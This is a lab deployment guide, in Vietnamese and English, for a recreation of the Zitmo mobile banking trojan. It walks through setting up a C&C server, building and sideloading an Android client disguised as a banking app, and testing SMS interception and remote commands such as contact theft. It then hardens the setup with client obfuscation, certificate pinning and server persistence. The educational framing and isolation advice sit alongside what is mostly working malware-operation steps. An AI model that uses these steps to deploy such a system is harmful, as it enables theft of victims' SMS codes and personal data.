# Hướng dẫn triển khai Zitmo System

## Tổng quan

Hướng dẫn này cung cấp các bước chi tiết để triển khai hệ thống mô phỏng Zitmo trong môi trường lab an toàn cho mục đích nghiên cứu và giáo dục.

## 1. Yêu cầu môi trường

### 1.1 Hardware Requirements

**Server C&C:**
- CPU: 2 cores minimum
- RAM: 4GB minimum
- Storage: 10GB free space
- Network: Static IP recommended

**Android Device/Emulator:**
- Android 5.0 (API 21) or higher
- RAM: 2GB minimum
- Storage: 1GB free space
- Network: WiFi/4G

### 1.2 Software Requirements

**Server:**
- Operating System: Linux/Windows/macOS
- Python 3.6+
- pip package manager
- SQLite3
- Network utilities (netstat, ss)

**Development:**
- Android Studio 4.0+
- JDK 8 or higher
- Android SDK
- ADB tools

## 2. Thiết lập môi trường Lab

### 2.1 Network Isolation

**Option 1: Virtual Network**
```bash
# Create isolated network using VirtualBox
VBoxManage natnetwork add --netname malware-lab --network "10.0.0.0/24" --enable
```

**Option 2: Physical Network**
- Use dedicated router
- Disable internet access
- Configure static IPs

**Network Diagram:**
```
[Internet] X--NO CONNECTION--X [Lab Router]
                                    |
                    +---------------+---------------+
                    |               |               |
                [C&C Server]  [Android Device]  [Admin PC]
              10.0.0.10        10.0.0.20       10.0.0.30
```

### 2.2 Firewall Rules

```bash
# Allow only internal communication
iptables -A INPUT -s 10.0.0.0/24 -j ACCEPT
iptables -A INPUT -j DROP

# Block outbound traffic
iptables -A OUTPUT -d 10.0.0.0/24 -j ACCEPT
iptables -A OUTPUT -j DROP
```

## 3. Server Deployment

### 3.1 Installation Steps

```bash
# 1. Clone repository
git clone https://github.com/yourusername/ZeuSZitma.git
cd ZeuSZitma/server

# 2. Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate  # Windows

# 3. Install dependencies
pip install flask

# 4. Configure server
cp config.example.py config.py
nano config.py
```

### 3.2 Configuration

**config.py:**
```python
# Server Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 5000
DEBUG = False  # Set to False in production
DB_PATH = 'zitmo_data.db'
LOG_FILE = 'zitmo_cnc.log'

# Security Settings (for production)
SECRET_KEY = 'your-secret-key-here'
API_KEY = 'your-api-key-here'  # Not implemented yet
```

### 3.3 Starting the Server

```bash
# Development mode
python zitmo_c2_server.py

# Production mode with gunicorn
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:5000 zitmo_c2_server:app
```

### 3.4 Systemd Service (Linux)

**Create service file:**
```bash
sudo nano /etc/systemd/system/zitmo-c2.service
```

**Service configuration:**
```ini
[Unit]
Description=Zitmo C&C Server
After=network.target

[Service]
Type=simple
User=zitmo
WorkingDirectory=/opt/zitmo/server
Environment="PATH=/opt/zitmo/server/venv/bin"
ExecStart=/opt/zitmo/server/venv/bin/gunicorn -w 4 -b 0.0.0.0:5000 zitmo_c2_server:app
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

**Enable service:**
```bash
sudo systemctl enable zitmo-c2.service
sudo systemctl start zitmo-c2.service
```

## 4. Client Deployment

### 4.1 Building the APK

```bash
# 1. Open project in Android Studio
cd ZeuSZitma/EduZitmo

# 2. Update server configuration
# Edit ZitmoUtils.java
SERVER_URL_DEFAULT = "http://10.0.0.10:5000"

# 3. Build APK
./gradlew assembleDebug
# or use Android Studio: Build > Build APK
```

### 4.2 Signing the APK (Optional)

```bash
# Generate keystore
keytool -genkey -v -keystore zitmo-key.keystore -alias zitmo -keyalg RSA -keysize 2048 -validity 10000

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore zitmo-key.keystore app-debug.apk zitmo

# Verify signature
jarsigner -verify -verbose -certs app-debug.apk
```

### 4.3 Installation Methods

**Method 1: ADB Install**
```bash
adb connect 10.0.0.20:5555  # For network ADB
adb install app-debug.apk
```

**Method 2: Manual Install**
1. Copy APK to device
2. Enable "Unknown Sources"
3. Install APK
4. Grant all permissions

**Method 3: Emulator**
```bash
# Start emulator
emulator -avd Pixel_3a_API_30 -netdelay none -netspeed full

# Install APK
adb install app-debug.apk
```

## 5. Testing & Verification

### 5.1 Server Health Check

```bash
# Check if server is running
curl http://10.0.0.10:5000/admin

# Check database
sqlite3 zitmo_data.db "SELECT * FROM devices;"

# Monitor logs
tail -f zitmo_cnc.log
```

### 5.2 Client Testing

**Test Registration:**
```bash
# Send test registration
curl -X POST http://10.0.0.10:5000/register \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "test-001",
    "device_info": "Test Device",
    "phone_number": "+84900000000",
    "operator": "Test"
  }'
```

**Test SMS Interception:**
1. Send SMS to test device
2. Check admin panel
3. Verify SMS appears

### 5.3 Command Testing

```bash
# Add test command
curl -X POST http://10.0.0.10:5000/admin/add_command \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "test-001",
    "command_type": "get_contacts",
    "command_data": "{}"
  }'
```

## 6. Monitoring & Maintenance

### 6.1 Log Monitoring

**Server logs:**
```bash
# Real-time monitoring
tail -f zitmo_cnc.log

# Search for errors
grep ERROR zitmo_cnc.log

# Log rotation
logrotate -f /etc/logrotate.d/zitmo
```

**Client logs:**
```bash
# View Android logs
adb logcat | grep -i zitmo
```

### 6.2 Database Maintenance

```bash
# Backup database
sqlite3 zitmo_data.db ".backup backup_$(date +%Y%m%d).db"

# Clean old data
sqlite3 zitmo_data.db "DELETE FROM intercepted_sms WHERE timestamp < datetime('now', '-30 days');"

# Vacuum database
sqlite3 zitmo_data.db "VACUUM;"
```

### 6.3 Performance Monitoring

```python
# Add to server for metrics
@app.route('/metrics')
def metrics():
    stats = {
        'total_devices': count_devices(),
        'active_devices': count_active_devices(),
        'total_sms': count_sms(),
        'pending_commands': count_pending_commands()
    }
    return jsonify(stats)
```

## 7. Security Hardening

### 7.1 Server Security

**1. Use HTTPS:**
```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365

# Configure Flask
app.run(ssl_context=('cert.pem', 'key.pem'))
```

**2. Add Authentication:**
```python
from functools import wraps

def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.headers.get('X-API-Key') != API_KEY:
            return jsonify({'error': 'Invalid API key'}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/add_command', methods=['POST'])
@require_api_key
def add_command():
    # ...
```

**3. Implement Rate Limiting:**
```python
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=lambda: request.remote_addr
)

@app.route('/ping', methods=['POST'])
@limiter.limit("60/minute")
def ping():
    # ...
```

### 7.2 Client Security

**1. Obfuscation:**
```gradle
android {
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
```

**2. Certificate Pinning:**
```java
// Add to network requests
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("yourserver.com", "sha256/XXXXXXXXXXX")
    .build();
```

## 8. Troubleshooting

### 8.1 Common Issues

**Server won't start:**
```bash
# Check port availability
netstat -tuln | grep 5000

# Check Python version
python --version

# Check permissions
ls -la zitmo_data.db
```

**Client can't connect:**
```bash
# Test connectivity
ping 10.0.0.10

# Check firewall
iptables -L

# Verify server is listening
curl http://10.0.0.10:5000/admin
```

**Database locked:**
```bash
# Kill stuck processes
fuser -k zitmo_data.db

# Check for corrupted database
sqlite3 zitmo_data.db "PRAGMA integrity_check;"
```

### 8.2 Debug Mode

**Enable server debug:**
```python
app.run(debug=True)
```

**Enable client debug:**
```java
public static final boolean DEBUG = true;
```

**Verbose logging:**
```python
logging.basicConfig(level=logging.DEBUG)
```

## 9. Backup & Recovery

### 9.1 Automated Backup

**backup.sh:**
```bash
#!/bin/bash
BACKUP_DIR="/backup/zitmo"
DATE=$(date +%Y%m%d_%H%M%S)

# Backup database
cp zitmo_data.db "$BACKUP_DIR/db_$DATE.db"

# Backup logs
cp zitmo_cnc.log "$BACKUP_DIR/log_$DATE.log"

# Backup config
cp config.py "$BACKUP_DIR/config_$DATE.py"

# Keep only last 7 days
find $BACKUP_DIR -type f -mtime +7 -delete
```

**Cron job:**
```bash
0 2 * * * /opt/zitmo/backup.sh
```

### 9.2 Recovery Procedure

```bash
# Stop server
systemctl stop zitmo-c2

# Restore database
cp /backup/zitmo/db_20231201.db zitmo_data.db

# Restart server
systemctl start zitmo-c2
```

## 10. Decommissioning

### 10.1 Cleanup Steps

```bash
# 1. Stop all services
systemctl stop zitmo-c2

# 2. Uninstall client
adb uninstall com.research.banking

# 3. Delete data
rm -rf /opt/zitmo
rm -rf /var/log/zitmo

# 4. Remove user
userdel zitmo

# 5. Clean firewall rules
iptables -F
```

### 10.2 Data Retention

**Before deletion:**
1. Export research data
2. Document findings
3. Secure sensitive data
4. Follow data retention policy

## 11. Best Practices

### 11.1 Lab Safety

1. **Physical Isolation:** Use air-gapped systems
2. **Network Segmentation:** VLAN separation
3. **Access Control:** Limited personnel
4. **Documentation:** Log all activities
5. **Legal Compliance:** Follow regulations

### 11.2 Operational Security

1. **Regular Updates:** Keep systems patched
2. **Monitor Logs:** Daily review
3. **Backup Regularly:** Automated backups
4. **Test Recovery:** Monthly drills
5. **Audit Access:** Review permissions

### 11.3 Educational Use

1. **Supervision:** Always monitor students
2. **Time Limits:** Schedule lab sessions
3. **Clear Objectives:** Define learning goals
4. **Ethics Training:** Emphasize responsibility
5. **Assessment:** Evaluate understanding

## Conclusion

Triển khai hệ thống Zitmo simulation yêu cầu:
- Chuẩn bị kỹ môi trường lab
- Tuân thủ các biện pháp bảo mật
- Giám sát chặt chẽ
- Sử dụng có trách nhiệm

**Nhắc nhở:** Hệ thống này CHỈ dành cho mục đích giáo dục và nghiên cứu trong môi trường lab được kiểm soát.